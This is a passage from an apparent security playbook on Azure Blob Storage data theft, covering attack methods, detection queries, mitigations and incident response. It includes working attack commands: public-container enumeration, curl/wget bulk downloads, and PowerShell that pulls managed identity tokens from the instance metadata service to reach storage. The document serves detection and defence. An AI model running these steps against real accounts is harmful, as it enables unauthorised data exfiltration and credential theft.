# Install QuickAZ
pip install quickaz

# Scan for storage accounts
quickaz -w wordlist.txt -t 100

# Output: List of valid storage accounts with public containers
```

**Expected Output:**
```
[+] Found storage account: contosobackup.blob.core.windows.net (ACCESSIBLE)
[+] Found storage account: contosoprod.blob.core.windows.net (ACCESSIBLE)
[+] Found storage account: acmecorplogs.blob.core.windows.net (ACCESSIBLE)

Container: backups (public read)
Container: customer-data (public read)
Container: logs (public read)
```

**What This Means:**
- **Public containers**: Accessible without authentication
- **No credentials needed**: Attacker downloads data directly
- **DNS enumeration**: Finds accounts via DNS brute-force (no Azure API access needed)

---

#### Step 2: Download Data from Public Containers

**Objective:** Exfiltrate data from publicly accessible containers.

**Command (All Versions - Using curl):**
```bash
# List blobs in public container
curl https://contosobackup.blob.core.windows.net/backups?restype=container&comp=list

# Download blob from public container (no authentication)
curl https://contosobackup.blob.core.windows.net/backups/database-backup-2026-01-06.bak -o database-backup-2026-01-06.bak

# Bulk download using wget
wget -r https://contosobackup.blob.core.windows.net/backups/
```

**Expected Output:**
```
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ...>
  <Blobs>
    <Blob>
      <Name>database-backup-2026-01-06.bak</Name>
      <Url>https://contosobackup.blob.core.windows.net/backups/database-backup-2026-01-06.bak</Url>
      <Size>850000000000</Size>
    </Blob>
    ...
  </Blobs>
</EnumerationResults>

[+] database-backup-2026-01-06.bak (850 GB downloaded)
[+] database-backup-2026-01-05.bak (850 GB downloaded)
[+] Total: 1.7 TB exfiltrated
```

**Business Impact:**
- **No authentication needed**: Attacker needs no credentials
- **Global access**: Publicly accessible storage is reachable worldwide
- **Backup exposure**: If backups public, complete data recovery possible by attacker

---

### METHOD 4: Managed Identity Token Extraction (SSRF from Compute)

**Supported Versions:** All Azure compute resources with assigned managed identity

**Prerequisites:** Code execution on Azure compute resource with storage-accessing managed identity

**Difficulty:** Medium (requires understanding of instance metadata service)

---

#### Step 1: Extract Managed Identity Token from Metadata Service

**Objective:** Retrieve Entra ID access token from Azure Instance Metadata Service (allows storage access if identity has permissions).

**Command (From Azure VM/Function - All Versions):**
```powershell
# Get managed identity token (from within Azure compute)
$MetadataUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://storage.azure.com"

$Response = Invoke-WebRequest -Uri $MetadataUri -Headers @{Metadata="true"} -UseBasicParsing
$TokenResponse = $Response.Content | ConvertFrom-Json
$AccessToken = $TokenResponse.access_token

Write-Host "[+] Token obtained: $($AccessToken.Substring(0, 50))..."
```

**Expected Output:**
```
[+] Token obtained: eyJhbGciOiJSUzI1NiIsImtpZCI6IjFjQUZwYjR...
```

---

#### Step 2: Use Token to Access Storage

**Objective:** Authenticate to storage account using managed identity token.

**Command (All Versions):**
```powershell
# Get token
$MetadataUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://storage.azure.com"
$TokenResponse = Invoke-WebRequest -Uri $MetadataUri -Headers @{Metadata="true"} -UseBasicParsing | ConvertFrom-Json
$AccessToken = $TokenResponse.access_token

# Use token to access storage (REST API)
$StorageAccountName = "prodstorageacct001"
$ContainerName = "data"

$ListUri = "https://$StorageAccountName.blob.core.windows.net/$ContainerName?restype=container&comp=list"
$Headers = @{Authorization = "Bearer $AccessToken"}

$BlobList = Invoke-WebRequest -Uri $ListUri -Headers $Headers -UseBasicParsing
$BlobXml = [xml]$BlobList.Content

Write-Host "[+] Found $($BlobXml.EnumerationResults.Blobs.Blob.Count) blobs in $ContainerName"
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Red Team Tests

- **Atomic Test T1530**: "Data from Cloud Storage Object" (Azure Blob Storage variant)
  - Lists and downloads blobs from storage account
  - Requires storage key or SAS token
  - Simulates data exfiltration

- **Atomic Test T1552.001 #15**: "Find Azure credentials on local system"
  - Searches for stored credentials in local config files
  - Finds storage keys/connection strings in PowerShell profiles, environment variables

**Execution:**
```powershell
Invoke-AtomicTest T1530 -TestNumbers 1
Invoke-AtomicTest T1552.001 -TestNumbers 15
```

**Reference:**
[Atomic Red Team T1530 - GitHub](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1530/T1530.md)

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Unusual Storage Account Key Retrieval

**Rule Configuration:**
- **Required Index**: `azure_activity` or `main` (if Azure logs sent to Splunk)
- **Required Sourcetype**: `azure:audit`
- **Required Fields**: OperationName, Caller, CallerIpAddress, Resource, ResultType
- **Alert Threshold**: Any occurrence (rare legitimate activity)
- **Applies To Versions**: All Azure regions

**SPL Query:**
```spl
sourcetype=azure:audit OperationName="List Storage Account Keys" ResultType="Success"
| stats count by Caller, CallerIpAddress, Resource, TimeCreated
| where count >= 1
```

**What This Detects:**
- **OperationName="List Storage Account Keys"**: Storage key retrieval (should be rare)
- **ResultType="Success"**: Successful key access
- **Alert Trigger**: Any occurrence (very low false positive rate)

---

### Rule 2: Bulk Data Download from Storage Account

**Rule Configuration:**
- **Required Index**: `azure_activity`
- **Required Sourcetype**: `azure:audit`, `azure:storage`
- **Alert Threshold**: 100+ blob read operations in 1 hour from single IP
- **Applies To Versions**: All Azure regions

**SPL Query:**
```spl
sourcetype=azure:storage OperationName="GetBlob" 
| stats count by CallerIpAddress, UserAgent, TimeGenerated
| where count > 100
| search UserAgent!="*AzureStorageExplorer*"  # Exclude admin tools
```

**What This Detects:**
- **GetBlob operations**: Blob read (normal but trackable)
- **count > 100**: Bulk download pattern
- **Unusual user agent**: AzCopy, Rclone, custom scripts (not standard Azure tools)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Storage Account Key List Access

**Rule Configuration:**
- **Required Table**: `AzureActivity`
- **Alert Severity**: **High**
- **Frequency**: Real-time (10 minutes)
- **Applies To Versions**: All Azure regions

**KQL Query:**
```kusto
AzureActivity
| where OperationName == "List Storage Account Keys"
| where ActivityStatus =~ "Success"
| project TimeGenerated, Caller, CallerIpAddress, Resource, OperationName
```

**Manual Configuration:**
1. **Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `Storage Account Key Retrieval`
3. Paste KQL above
4. Frequency: 10 minutes
5. Severity: High
6. **Create**

---

### Query 2: Anomalous Blob Read Pattern

**Rule Configuration:**
- **Required Table**: `StorageBlobLogs`
- **Alert Severity**: **High**
- **Frequency**: 1 hour
- **Applies To Versions**: All Azure regions (with diagnostic logging enabled)

**KQL Query:**
```kusto
StorageBlobLogs
| where OperationName == "GetBlob"
| where AuthenticationType == "SAS" or AuthenticationType == "AccountKey"
| summarize ReadCount = count() by CallerIpAddress, UserAgent, bin(TimeGenerated, 1h)
| where ReadCount > 100
| join kind=inner (StorageBlobLogs | where OperationName == "GetBlob" | summarize by CallerIpAddress) on CallerIpAddress
```

**What This Detects:**
- **100+ reads in 1 hour**: Bulk download pattern
- **Specific IP**: Identifies source of extraction
- **SAS or AccountKey auth**: Rules out RBAC (more suspicious)

---

## 9. AZURE DIAGNOSTIC LOGGING CONFIGURATION

### Enable Storage Account Diagnostic Logging

**Manual Steps (Azure Portal):**
1. Navigate to **Storage Account** → Select account
2. Left menu → **Diagnostic settings**
3. Click **+ Add diagnostic setting**
4. **Name**: `Storage-Blob-Logging`
5. **Logs**:
   - Check: **StorageRead**, **StorageWrite**, **StorageDelete**
6. **Destination**:
   - Send to Log Analytics workspace (your Sentinel workspace)
7. **Save**
8. Wait 15 minutes for first events

**Manual Configuration (PowerShell):**
```powershell
# Enable diagnostic logging for storage account
$StorageAccountName = "prodstorageacct001"
$ResourceGroupName = "production-rg"
$WorkspaceId = "/subscriptions/{subId}/resourcegroups/{rg}/providers/microsoft.operationalinsights/workspaces/{workspace}"

$StorageAccountId = "/subscriptions/{subId}/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage/storageAccounts/$StorageAccountName"

Set-AzDiagnosticSetting -ResourceId $StorageAccountId `
    -Name "StorageDiagnostics" `
    -WorkspaceId $WorkspaceId `
    -Enabled $true `
    -Category StorageRead, StorageWrite, StorageDelete
```

**Verify Logging (Sentinel):**
```kusto
// Run in Sentinel Logs
StorageBlobLogs
| take 20
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Disable Shared Key Authorization (Use RBAC + SAS Only)

**Objective**: Eliminate storage account key access entirely; force RBAC or User Delegation SAS (both respect Azure IAM policies).

**Applies To**: All storage accounts

**Impact**: Prevents METHOD 1 (direct key retrieval)

**Manual Steps (Azure Portal):**
1. Navigate to **Storage Account** → **Settings** → **Configuration**
2. Find: **Allow storage account key access**
3. Set to: **Disabled**
4. **Save**

**Manual Steps (PowerShell):**
```powershell
# Disable shared key access
Set-AzStorageAccount -ResourceGroupName "production-rg" `
    -AccountName "prodstorageacct001" `
    -AllowSharedKeyAccess $false

# Verify
$Account = Get-AzStorageAccount -ResourceGroupName "production-rg" -Name "prodstorageacct001"
Write-Host "Shared Key Access: $($Account.AllowSharedKeyAccess)"
```

**Expected Output:**
```
Shared Key Access: False
```

**Impact on Users:**
- ✅ Shared keys cannot be retrieved
- ✅ All access via RBAC or User Delegation SAS (respects IAM)
- ⚠️ Legacy applications using connection strings fail (must migrate)
- ⚠️ AzCopy with key fails (must use SAS token or identity)

**Migration Path:**
1. **Before disabling**: Identify all applications using storage keys
2. **Migrate to**:
   - Azure Managed Identity (preferred for Azure-hosted apps)
   - User Delegation SAS (for external users/partners)
   - Service Principal with RBAC role
3. **Testing**: Test migrated apps in dev/test before production
4. **Disable**: After successful migration, disable shared keys

**Validation Command (Verify Escalation Blocked):**
```powershell
# After disabling shared keys, attempt retrieval:
try {
    $Keys = Get-AzStorageAccountKey -ResourceGroupName "production-rg" -AccountName "prodstorageacct001" -ErrorAction Stop
    Write-Host "[-] Shared keys still retrievable!" -ForegroundColor Red
} catch {
    Write-Host "[+] Key retrieval blocked - shared key access disabled!" -ForegroundColor Green
}
```

**Expected Output:**
```
[+] Key retrieval blocked - shared key access disabled!
```

**References:**
- [Disable Shared Key Authorization](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent)

---

#### 1.2 Use User Delegation SAS Tokens (Time-Limited, Entra ID-Signed)

**Objective**: Replace Account SAS tokens with User Delegation SAS (respects RBAC, expires automatically, better auditability).

**Applies To**: All storage accounts (after disabling shared keys)

**Impact**: Limits token scope and lifetime

**Manual Steps (Generate User Delegation SAS - PowerShell):**
```powershell
# Get user delegation key (signed by Entra ID user, not account key)
$StorageAccountName = "prodstorageacct001"
$ResourceGroupName = "production-rg"

# Create storage context (using Entra ID authentication, not keys)
$StorageContext = New-AzStorageContext -StorageAccountName $StorageAccountName -UseConnectedAccount

# Get user delegation key (valid for 1 hour)
$UserDelegationKey = Get-AzStorageUserDelegationKey -StorageContext $StorageContext

# Generate User Delegation SAS (scoped to single container, 1 hour expiry)
$SASToken = New-AzStorageContainerSASToken -Name "customer-data" `
    -Permission rl `
    -ExpiryTime (Get-Date).AddHours(1) `
    -Context $StorageContext `
    -UserDelegationKey $UserDelegationKey

Write-Host "User Delegation SAS: $SASToken"
Write-Host "[+] Token expires in 1 hour; respects RBAC of issuing user"
```

**Expected Output:**
```
User Delegation SAS: sv=2021-06-08&ss=b&srt=c&sp=rl&se=2026-01-06T12:06:00Z&st=2026-01-06T11:06:00Z&spr=https&sig=ABC123DEF456==

[+] Token expires in 1 hour; respects RBAC of issuing user
```

**Advantages of User Delegation SAS:**
- ✅ Time-limited (1 hour typical, not days/months)
- ✅ Signed by Entra ID user (respects user's permissions)
- ✅ If user's role revoked, token access limited
- ✅ Cannot be shared indefinitely (expires automatically)
- ✅ Better auditability (token tied to specific user)

**References:**
- [User Delegation SAS](https://learn.microsoft.com/en-us/azure/storage/blobs/create-user-delegation-sas)

---

#### 1.3 Enable Diagnostic Logging & Real-Time Alerting

**Objective**: Capture all blob access operations and alert on suspicious patterns.

**Applies To**: All storage accounts

**Impact**: Enables detection of METHOD 1, 3, 4 attacks

**Manual Steps** (see Section 9 above for details)

---

### Priority 2: HIGH

#### 2.1 Implement Private Endpoints + Network Firewall

**Objective**: Restrict storage account access to private network only; prevent internet-accessible key extraction.

**Applies To**: Storage accounts containing sensitive data

**Manual Steps (Azure Portal):**
1. Navigate to **Storage Account** → **Networking**
2. Click **+ Private endpoint**
3. **Resource group**: Your resource group
4. **Name**: `prod-storage-private-endpoint`
5. **Sub-resource**: `blob` (for blob storage)
6. **Virtual network**: Your private VNet
7. **Subnet**: Private subnet
8. **Click Create**
9. Go to **Networking** → **Firewall**
10. Set **Default Action**: **Deny**
11. Add authorized IPs/vNets: Corporate VPN, app servers, etc.
12. **Save**

**Impact:**
- ✅ Storage account only accessible from private network
- ✅ Internet access blocked (prevents METHOD 3 - public enumeration)
- ✅ Exfiltration requires VPN/bastion access
- ⚠️ Legitimate apps must be on private network

---

#### 2.2 Implement Managed Identities (Eliminate Keys in Code)

**Objective**: Replace hardcoded storage keys in applications with Azure Managed Identity (automatic, time-bound authentication).

**Applies To**: Azure-hosted applications (VMs, Functions, App Services, Containers)

**Impact**: Reduces exposure of keys in source code, CI/CD logs

**Manual Steps (Assign Managed Identity to VM):**
1. Navigate to **Virtual Machine** → Select VM
2. Left menu → **Identity**
3. **Status**: ON
4. **Save**
5. Navigate to **Storage Account** → **Access Control (IAM)**
6. Click **+ Add role assignment**
7. Role: **Storage Blob Data Contributor** (or Reader if read-only)
8. Assign to: **Managed Identity** → Select the VM
9. **Save**

**Application Code:**
```csharp
// No secrets in code!
var credential = new DefaultAzureCredential();  // Uses managed identity
var client = new BlobContainerClient(new Uri("https://storageacct.blob.core.windows.net/container"), credential);
var blobs = client.GetBlobs();
```

---

#### 2.3 Enable Microsoft Defender for Storage

**Objective**: Automated detection of malware, unusual access patterns, data exfiltration.

**Applies To**: All storage accounts

**Manual Steps (Azure Portal):**
1. Navigate to **Storage Account** → **Defender for Cloud**
2. Enable: **Defender for Storage**
3. **Save**

**Manual Steps (PowerShell):**
```powershell
# Enable Defender for Storage
$StorageAccountId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{accountName}"

Update-AzSecurityPricing -PricingTier "Standard" -ResourceType "StorageAccounts"
```

**Alerts Include:**
- Malware uploaded to blob storage
- Unusual data exfiltration volume
- Access from suspicious IP/location
- Possible ransomware activity

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

#### Azure Activity Log Patterns
- **Operation**: "List Storage Account Keys" from non-admin IP
- **Timing**: After-hours or weekend access
- **Frequency**: Repeated key retrieval attempts
- **Result**: Success (indicates key obtained)

#### Storage Blob Log Patterns
- **Operation**: GetBlob with high frequency (100+ in 1 hour)
- **User Agent**: AzCopy, Rclone, custom scripts (not standard browsers)
- **IP Address**: External/non-corporate IPs
- **Data Volume**: Gigabytes/terabytes transferred in short time
- **Timing**: Unusual hours (nights, weekends, holidays)

#### Network Indicators
- **Egress**: High data volume to external IPs (10+ GB/hour unusual)
- **Port 443 HTTPS**: Sustained outbound HTTPS connections
- **Geo IP**: Access from unexpected countries/regions

---

### Forensic Artifacts

#### Azure Activity Log
- **Location**: Subscription → Activity Log (90 days retention if sent to Log Analytics)
- **Evidence**:
  - Exact timestamp of key retrieval
  - User/service principal identity
  - IP address of caller
  - Success/failure status
  - Resource accessed

#### Storage Blob Logs (AzureDiagnostics)
- **Location**: Log Analytics Workspace → StorageBlobLogs table
- **Evidence**:
  - Specific blobs accessed
  - Read/write/delete operations
  - Caller IP address
  - User agent (tool used)
  - Timestamp
  - Authentication type (key, SAS, RBAC)

#### Audit Trail
- **Access Policy changes**: Who changed what, when
- **Key rotation history**: When keys were rotated, by whom
- **Diagnostic setting changes**: When logging enabled/disabled

---

### Response Procedures

#### Step 1: Isolate Storage Account

**Objective**: Prevent further data exfiltration while investigation proceeds.

**Command (Disable Access - All Methods):**
```powershell
# Option 1: Enable firewall (blocks all internet access)
Update-AzStorageAccount -ResourceGroupName "production-rg" -AccountName "prodstorageacct001" `
    -NetworkRuleBypassDefaultAction "None" `
    -DefaultAction Deny

# Option 2: Disable access temporarily (regenerate keys)
$StorageAccount = Get-AzStorageAccount -ResourceGroupName "production-rg" -Name "prodstorageacct001"
New-AzStorageAccountKey -ResourceGroupName "production-rg" -Name "prodstorageacct001" -KeyName Primary

Write-Host "[+] Storage account access restricted"
Write-Host "[!] Primary key rotated - all old keys now invalid"
```

**Impact:**
- ✅ Attacker cannot access storage using old keys
- ⚠️ Legitimate applications lose access (requires reconfiguration)
- ⚠️ May cause service outage

---

#### Step 2: Rotate All Access Keys

**Objective**: Invalidate stolen keys immediately.

**Command (All Versions):**
```powershell
# Rotate primary key
New-AzStorageAccountKey -ResourceGroupName "production-rg" -Name "prodstorageacct001" -KeyName Primary

Write-Host "[+] Primary key rotated (old key invalidated)"

# Wait 5 minutes
Start-Sleep -Seconds 300

# Rotate secondary key
New-AzStorageAccountKey -ResourceGroupName "production-rg" -Name "prodstorageacct001" -KeyName Secondary

Write-Host "[+] Secondary key rotated (all old keys invalidated)"
Write-Host "[!] Applications using old keys now fail - update config immediately"
```

---

#### Step 3: Investigate Exfiltrated Data

**Objective**: Determine what data was accessed.

**Command (Query Blob Logs):**
```kusto
// Sentinel: Determine accessed blobs
StorageBlobLogs
| where OperationName == "GetBlob"
| where CallerIpAddress == "203.0.113.50"  // Attacker IP
| where TimeGenerated between (datetime(2026-01-06 10:00:00Z) .. datetime(2026-01-06 12:00:00Z))
| summarize TotalBytes = sum(ResponseContentLength), AccessCount = count() by Resource, Identity
| order by TotalBytes desc
```

**Expected Output:**
```
Resource                              TotalBytes    AccessCount  Identity
----                                  ----------    -----------  --------
customer-data-export-2026.csv         850000000    1            svc_attacker
database-backup-2026-01-06.bak        850000000000 1            svc_attacker
customer-pii.sql                      45000000     1            svc_attacker

Total: ~1.7 TB exfiltrated
```

---

#### Step 4: Determine Scope of Compromise

**Objective**: Identify if exfiltrated data was used elsewhere.

**Actions:**
- **Ransomware check**: Scan for encrypted files (attacker may have backed up data before encryption)
- **Data usage check**: Search dark web / pastebin for exposed data
- **Application audit**: Check if attacker used stolen connection strings to access databases
- **Regulatory notification**: If PII exposed, begin breach notification (GDPR Art. 33)

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | MITRE ID | Description | Enablement |
|---|---|---|---|---|
| **1** | **Initial Access** | Phishing / Web Exploit | T1566 / T1190 | Compromise developer/admin machine | Enables code execution |
| **2** | **Execution** | PowerShell / Cloud CLI | T1059 | Execute Azure commands | Enables Azure authentication |
| **3** | **Persistence** | Create Service Principal | T1136 | Create attacker-controlled identity in Entra ID | Enables future access |
| **4** | **Privilege Escalation (Optional)** | RBAC Role Assignment Abuse | T1098 | Elevate to Storage Account Key Operator role | **PREREQUISITE for METHOD 1** |
| **5** | **Credential Access (Current)** | **Storage Account Key Theft** | **T1552.001** | **Retrieve storage account keys** | **Enables unrestricted storage access** |
| **6** | **Collection** | **Data from Cloud Storage** | **T1530** | **Download blobs/files** | **Enables data exfiltration** |
| **7** | **Exfiltration** | Unencrypted Channel | T1048 | Transfer data to attacker infrastructure | **IMPACT: Data breach** |
| **8** | **Impact** | Data Destruction / Ransomware | T1485 / T1561 | Delete backups, deploy encryption | **FINAL IMPACT: Unrecoverable loss** |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Microsoft AI Researchers Data Exposure (September 2023)

- **Organization**: Microsoft Research
- **Exposure**: 38 Terabytes of sensitive data
- **Timeline**: Data leaked via SAS tokens embedded in shared links
- **Leaked Data**:
  - Source code and ML models
  - Internal documentation
  - API keys and tokens
  - Training datasets
  - Unreleased research
- **Discovery Method**: Wiz Security automated scanning (detected via SAS token enumeration in blob metadata)
- **Root Cause**: SAS tokens shared in unencrypted emails and documentation; tokens lacked expiration dates
- **Business Impact**:
  - Intellectual property loss
  - Security research preempted by attacker publication
  - Regulatory investigation
  - Reputational damage
- **Detection**: Wiz discovered before large-scale exfiltration by attacker
- **References**: [Wiz Blog - 38TB Microsoft Exposure](https://www.wiz.io/blog/38-terabytes-of-private-data-accidentally-exposed-by-microsoft-ai-researchers)

---

### Example 2: Storm-0501 Cloud Storage Campaign (2025)

- **APT Group**: Storm-0501 (activity group)
- **Targets**: Azure storage accounts in multiple organizations
- **Technique**: Disable logging, establish private endpoints, distribute exfiltration
- **Attack Method**:
  1. Compromise service principal with Storage Contributor role
  2. Retrieve storage account keys
  3. Disable diagnostic logging (hide tracks)
  4. Create private endpoints for backdoor access
  5. Download sensitive data in bulk
  6. Use AzCopy distributed across multiple regions
- **Indicators**:
  - Sudden logging disable
  - Private endpoint creation
  - Bulk downloads from multiple IPs
  - New service principal in roles
- **Impact**: Multi-organization campaign; terabytes of data exfiltrated
- **Reference**: [Microsoft Threat Intelligence](https://www.microsoft.com/security/blog/2025/10/20/inside-the-attack-chain-threat-activity-targeting-azure-blob-storage/)

---

### Example 3: Azure Misconfiguration Chain Leading to Admin Compromise (June 2025)

- **Scenario**: Multi-step escalation from public data to Global Admin
- **Attack Method**:
  1. **Step 1**: Public CSV file with hardcoded AAD user credentials → compromised user account
  2. **Step 2**: User is Application Owner → create service principal with Storage Contributor role
  3. **Step 3**: Service principal retrieves storage account key (METHOD 1)
  4. **Step 4**: Cloud Shell environment image stored in private storage (encrypted backup)
  5. **Step 5**: Attacker modifies Cloud Shell image (injects RCE payload)
  6. **Step 6**: Cloud Shell image deployed; admin logs in → RCE as admin
  7. **Step 7**: Steal Global Admin token → compromise entire Entra ID tenant
- **Root Cause Chain**: Public CSV → Role ownership → Key access → Image modification → RCE → Admin token theft
- **Impact**: Complete tenant compromise
- **Duration**: Days (fast escalation possible if misconfigured)
- **Reference**: [GB Hackers - Azure Misconfiguration](https://gbhackers.com/azure-misconfiguration-take-over-cloud-infrastructure/)

---

### Example 4: Backup Data Exfiltration & Ransomware Deployment

- **Scenario**: Attacker exfiltrates backups, then deploys ransomware
- **Attack Method**:
  1. Retrieve storage account keys
  2. Download all backup containers (database backups, VM images, configs)
  3. Delete backup containers (prevent recovery)
  4. Deploy ransomware to production systems
  5. Demand ransom: "Pay or we release stolen data and ensure you can't recover"
- **Business Impact**:
  - **Data Loss**: Cannot restore from backups (deleted)
  - **Service Downtime**: Weeks to months recovery (restore from external/offline backups if available)
  - **Ransom**: Attacker has leverage (threatened data + encryption)
  - **Regulatory**: Cannot meet RTO/RPO SLAs → violations
- **Prevention**: Immutable backups (prevent deletion), geo-redundancy, offline copies

---

## 14. INCIDENT RESPONSE CHECKLIST

### Immediate Actions (0-2 hours)

- [ ] **Confirm breach**: Query storage logs for suspicious key retrieval / blob access
- [ ] **Isolate storage**: Enable firewall (block all access) or remove keys from circulation
- [ ] **Rotate keys**: Primary and secondary keys (invalidate stolen keys)
- [ ] **Preserve logs**: Export Azure Activity Log and StorageBlobLogs for forensics
- [ ] **Notify leadership**: CTO, CISO, Legal, Executive team
- [ ] **Disable suspicious identities**: Disable service principals that retrieved keys

### Short-Term Actions (2-24 hours)

- [ ] **Identify exfiltrated data**: Query logs to determine which containers/blobs accessed
- [ ] **Assess regulatory impact**: Did PII/regulated data breach? (GDPR, HIPAA, SOX, etc.)
- [ ] **Enable comprehensive logging**: Ensure diagnostic settings configured for future detection
- [ ] **Deploy Defender for Storage**: Automated detection of anomalies
- [ ] **Migrate off shared keys**: Implement User Delegation SAS or Managed Identity for applications
- [ ] **Check for lateral movement**: Did attacker use stolen data to access other systems?

### Medium-Term Actions (1-2 weeks)

- [ ] **Conduct forensic analysis**: Timeline of compromise, scope assessment
- [ ] **Disable Shared Key authorization**: Force RBAC + SAS only (if not done)
- [ ] **Implement Private Endpoints**: Network isolation (prevent internet access)
- [ ] **Review RBAC assignments**: Least privilege audit
- [ ] **Threat hunting**: Search for additional compromised accounts/service principals
- [ ] **User notifications**: Breach notification if customer data exposed (regulatory requirement)

### Long-Term Actions (Ongoing)

- [ ] **Monitor storage access**: Baseline normal patterns; alert on anomalies
- [ ] **Secrets rotation**: Auto-rotate keys every 90 days
- [ ] **Compliance verification**: Ensure GDPR, HIPAA, SOX, NIS2 controls in place
- [ ] **Training**: Developer education on secure credential handling
- [ ] **Architecture review**: Post-mortem of access controls; implement findings
- [ ] **Incident response drills**: Practice data exfiltration scenarios quarterly

---
